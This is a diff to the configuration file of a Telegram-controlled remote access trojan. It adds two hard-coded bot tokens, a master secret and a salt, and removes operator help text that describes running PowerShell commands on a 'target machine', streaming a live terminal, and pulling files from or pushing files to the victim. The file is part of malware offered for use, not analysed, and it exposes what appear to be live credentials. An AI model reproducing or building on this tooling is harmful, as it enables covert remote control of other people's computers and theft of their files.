@@ -1,18 +1,12 @@
-# Configuration constants
+"""
+Configuration for Telegram RAT
+"""
+
 TOKEN = '8837786862:AAG5ojj6XNXr1rIv6FHupAFQdsKsrJHL50Q'
+PAYLOAD_BOT_TOKEN = '8656129474:AAFjMhWj8W3OgzzfOzQ5Zi30ZC9HOSWo0yo'
+MASTER_SECRET = 'CHANGE_THIS_TO_RANDOM_STRING_123456789'
+SALT = b'fixed_salt_for_key_derivation_32bytes_12345'
 
-INFO_MSG = (
-    "Send me PowerShell commands to execute on your target machine.\n"
-    "More - /help"
-)
 
-HELP_TEXT = (
-    "Usage:\n\n"
-    "/start - Start the bot (PowerShell enabled)\n"
-    "/help - Show this help message\n"
-    "/live - Activate live terminal mode (stream output)\n"
-    "/normal - Deactivate live terminal mode\n"
-    "/get <filename> - Download a file from the current directory\n"
-    "Send/Drop files to upload them to the current directory\n"
-    "All commands are executed via PowerShell on Windows.\n"
-)
+POLLING_INTERVAL = 2
+MAX_RETRIES = 5
